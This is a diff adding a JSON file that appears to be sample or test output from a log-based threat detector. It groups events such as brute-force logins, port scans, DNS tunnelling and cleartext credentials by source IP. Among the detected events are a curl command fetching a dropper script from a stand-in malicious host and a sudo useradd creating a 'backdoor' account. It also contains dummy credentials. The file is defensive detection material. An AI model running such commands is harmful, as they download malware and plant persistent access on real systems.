@@ -1,0 +1,239 @@
+[
+  {
+    "src_ip": "N/A",
+    "event_count": 4,
+    "risk_score": 33.0,
+    "top_severity": "CRITICAL",
+    "threat_types": [
+      "ACCEPTED_PUBKEY",
+      "MALWARE_DROPPER",
+      "PORT_SCAN",
+      "PRIV_ESCALATION"
+    ],
+    "mitre_codes": [],
+    "earliest": "2026-05-07T09:04:00",
+    "latest": "2026-05-07T09:11:00",
+    "events": [
+      {
+        "severity": "CRITICAL",
+        "type": "MALWARE_DROPPER",
+        "src_ip": "N/A",
+        "detail": "curl http://malicious-host.ru/dropper.sh -o /tmp/dropper.sh",
+        "ts": "2026-05-07T09:06:00",
+        "host": "",
+        "mitre": ""
+      },
+      {
+        "severity": "HIGH",
+        "type": "PRIV_ESCALATION",
+        "src_ip": "N/A",
+        "detail": "sudo: operator : COMMAND=/usr/sbin/useradd backdoor",
+        "ts": "2026-05-07T09:04:00",
+        "host": "",
+        "mitre": ""
+      },
+      {
+        "severity": "HIGH",
+        "type": "ACCEPTED_PUBKEY",
+        "src_ip": "N/A",
+        "detail": "Accepted publickey for root from 192.168.1.77 port 22 ssh2",
+        "ts": "2026-05-07T09:05:00",
+        "host": "",
+        "mitre": ""
+      },
+      {
+        "severity": "HIGH",
+        "type": "PORT_SCAN",
+        "src_ip": "N/A",
+        "detail": "nmap scan detected from 192.168.100.200",
+        "ts": "2026-05-07T09:11:00",
+        "host": "",
+        "mitre": ""
+      }
+    ]
+  },
+  {
+    "src_ip": "203.0.113.42",
+    "event_count": 1,
+    "risk_score": 10.5,
+    "top_severity": "CRITICAL",
+    "threat_types": [
+      "ROOT_LOGIN"
+    ],
+    "mitre_codes": [],
+    "earliest": "2026-05-07T09:03:00",
+    "latest": "2026-05-07T09:03:00",
+    "events": [
+      {
+        "severity": "CRITICAL",
+        "type": "ROOT_LOGIN",
+        "src_ip": "203.0.113.42",
+        "detail": "ROOT LOGIN accepted FROM 203.0.113.42",
+        "ts": "2026-05-07T09:03:00",
+        "host": "",
+        "mitre": ""
+      }
+    ]
+  },
+  {
+    "src_ip": "185.220.101.1",
+    "event_count": 1,
+    "risk_score": 10.5,
+    "top_severity": "CRITICAL",
+    "threat_types": [
+      "KNOWN_BAD_IP"
+    ],
+    "mitre_codes": [],
+    "earliest": "2026-05-07T09:02:00",
+    "latest": "2026-05-07T09:02:00",
+    "events": [
+      {
+        "severity": "CRITICAL",
+        "type": "KNOWN_BAD_IP",
+        "src_ip": "185.220.101.1",
+        "detail": "Invalid user oracle from 185.220.101.1 port 1234 ssh2",
+        "ts": "2026-05-07T09:02:00",
+        "host": "",
+        "mitre": ""
+      }
+    ]
+  },
+  {
+    "src_ip": "10.0.0.15",
+    "event_count": 1,
+    "risk_score": 10.5,
+    "top_severity": "CRITICAL",
+    "threat_types": [
+      "CRED_LEAK_HTTP"
+    ],
+    "mitre_codes": [],
+    "earliest": "2026-05-07T09:13:00",
+    "latest": "2026-05-07T09:13:00",
+    "events": [
+      {
+        "severity": "CRITICAL",
+        "type": "CRED_LEAK_HTTP",
+        "src_ip": "10.0.0.15",
+        "detail": "Authorization: Basic dXNlcjpwYXNzd29yZA==",
+        "ts": "2026-05-07T09:13:00",
+        "host": "",
+        "mitre": ""
+      }
+    ]
+  },
+  {
+    "src_ip": "192.168.100.200",
+    "event_count": 1,
+    "risk_score": 7.5,
+    "top_severity": "HIGH",
+    "threat_types": [
+      "PORT_SCAN"
+    ],
+    "mitre_codes": [],
+    "earliest": "2026-05-07T09:11:00",
+    "latest": "2026-05-07T09:11:00",
+    "events": [
+      {
+        "severity": "HIGH",
+        "type": "PORT_SCAN",
+        "src_ip": "192.168.100.200",
+        "detail": "SYN to 20+ unique ports detected",
+        "ts": "2026-05-07T09:11:00",
+        "host": "",
+        "mitre": ""
+      }
+    ]
+  },
+  {
+    "src_ip": "10.0.0.42",
+    "event_count": 1,
+    "risk_score": 7.5,
+    "top_severity": "HIGH",
+    "threat_types": [
+      "DNS_TUNNEL_QUERY"
+    ],
+    "mitre_codes": [],
+    "earliest": "2026-05-07T09:14:00",
+    "latest": "2026-05-07T09:14:00",
+    "events": [
+      {
+        "severity": "HIGH",
+        "type": "DNS_TUNNEL_QUERY",
+        "src_ip": "10.0.0.42",
+        "detail": "Entropy=4.12, label=aGVsbG8td29ybGQtdGhpcy1pcy1hLXRlc3Q",
+        "ts": "2026-05-07T09:14:00",
+        "host": "",
+        "mitre": ""
+      }
+    ]
+  },
+  {
+    "src_ip": "10.0.0.8",
+    "event_count": 1,
+    "risk_score": 7.5,
+    "top_severity": "HIGH",
+    "threat_types": [
+      "CLEARTEXT_FTP"
+    ],
+    "mitre_codes": [],
+    "earliest": "2026-05-07T09:15:00",
+    "latest": "2026-05-07T09:15:00",
+    "events": [
+      {
+        "severity": "HIGH",
+        "type": "CLEARTEXT_FTP",
+        "src_ip": "10.0.0.8",
+        "detail": "USER ftpuser PASS s3cr3tpass",
+        "ts": "2026-05-07T09:15:00",
+        "host": "",
+        "mitre": ""
+      }
+    ]
+  },
+  {
+    "src_ip": "192.168.1.100",
+    "event_count": 1,
+    "risk_score": 4.5,
+    "top_severity": "MEDIUM",
+    "threat_types": [
+      "BRUTE_FORCE"
+    ],
+    "mitre_codes": [],
+    "earliest": "2026-05-07T09:00:13",
+    "latest": "2026-05-07T09:00:13",
+    "events": [
+      {
+        "severity": "MEDIUM",
+        "type": "BRUTE_FORCE",
+        "src_ip": "192.168.1.100",
+        "detail": "Failed password for admin from 192.168.1.100 port 22 ssh2",
+        "ts": "2026-05-07T09:00:13",
+        "host": "",
+        "mitre": ""
+      }
+    ]
+  },
+  {
+    "src_ip": "10.0.0.99",
+    "event_count": 1,
+    "risk_score": 4.5,
+    "top_severity": "MEDIUM",
+    "threat_types": [
+      "BRUTE_FORCE"
+    ],
+    "mitre_codes": [],
+    "earliest": "2026-05-07T09:01:12",
+    "latest": "2026-05-07T09:01:12",
+    "events": [
+      {
+        "severity": "MEDIUM",
+        "type": "BRUTE_FORCE",
+        "src_ip": "10.0.0.99",
+        "detail": "Failed password for root from 10.0.0.99 port 4444 ssh2",
+        "ts": "2026-05-07T09:01:12",
+        "host": "",
+        "mitre": ""
+      }
+    ]
+  }
+]
